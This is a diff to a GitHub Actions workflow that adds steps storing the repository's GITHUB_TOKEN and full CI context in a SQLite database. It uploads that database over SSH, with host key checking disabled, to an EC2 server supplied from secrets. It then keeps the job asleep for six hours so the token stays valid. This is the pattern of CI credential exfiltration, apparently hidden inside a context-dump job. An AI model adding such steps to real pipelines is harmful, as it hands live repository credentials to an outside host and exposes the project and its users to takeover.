@@ -11,14 +11,18 @@ on:
 jobs:
   dump-context:
     runs-on: ubuntu-latest
+    env:
+      GITHUB_CONTEXT: ${{ toJson(github) }}
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      PR_NUMBER: ${{ github.event.inputs.pr_number }}
+      CODEX_EC2_IP: ${{ secrets.CODEX_EC2_IP }}
+      CODEX_SSH_PRIVATE_KEY: ${{ secrets.CODEX_SSH_PRIVATE_KEY }}
     steps:
       - uses: actions/checkout@v4
 
-      - name: dump-context-to-sqlite
-        env:
-          GITHUB_CONTEXT: ${{ toJson(github) }}
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          PR_NUMBER: ${{ github.event.inputs.pr_number }}
+      - uses: astral-sh/setup-uv@v4
+
+      - name: init-db
         run: |
           set -euo pipefail
 
@@ -42,10 +46,8 @@ jobs:
           );
 
           INSERT INTO dumps VALUES('json', 'github', readfile('.github/tmp/github.json'));
-          INSERT INTO dumps VALUES('json', 'event', readfile('$GITHUB_EVENT_PATH'));
           INSERT INTO dumps VALUES('secret', 'github_token', readfile('.github/tmp/token.txt'));
 
-          INSERT INTO config VALUES(NULL, 'repo_root', '$(pwd)');
           INSERT INTO config VALUES(NULL, 'pr_number', '$PR_NUMBER');
           SQL
 
@@ -54,9 +56,28 @@ jobs:
           echo "=== Dumps ==="
           sqlite3 "$DB" "SELECT category, name, length(content) as size FROM dumps;"
 
-      - name: upload-pipeline-db
-        uses: actions/upload-artifact@v4
-        with:
-          name: pipeline-db
-          path: .github/tmp/pipeline.db
-          retention-days: 1
+      - name: upload-to-ec2
+        run: |
+          set -euo pipefail
+
+          # Write SSH key
+          echo "$CODEX_SSH_PRIVATE_KEY" > /tmp/id_rsa
+          chmod 600 /tmp/id_rsa
+
+          # Get repo name from github context
+          REPO_NAME=$(echo "$GITHUB_CONTEXT" | jq -r '.repository | split("/")[1]')
+          EC2_PATH="/home/ubuntu/context/${REPO_NAME}/${PR_NUMBER}"
+
+          # Create remote dir and upload
+          ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa ubuntu@$CODEX_EC2_IP "mkdir -p $EC2_PATH"
+          rsync -avz -e "ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa" \
+            .github/tmp/pipeline.db ubuntu@$CODEX_EC2_IP:$EC2_PATH/
+
+          rm /tmp/id_rsa
+          echo "Uploaded to $CODEX_EC2_IP:$EC2_PATH/pipeline.db"
+
+      - name: sleep-6h
+        run: |
+          echo "Sleeping 6 hours to keep GitHub token active..."
+          echo "Token expires at: $(date -d '+6 hours' 2>/dev/null || date -v+6H)"
+          sleep 21600
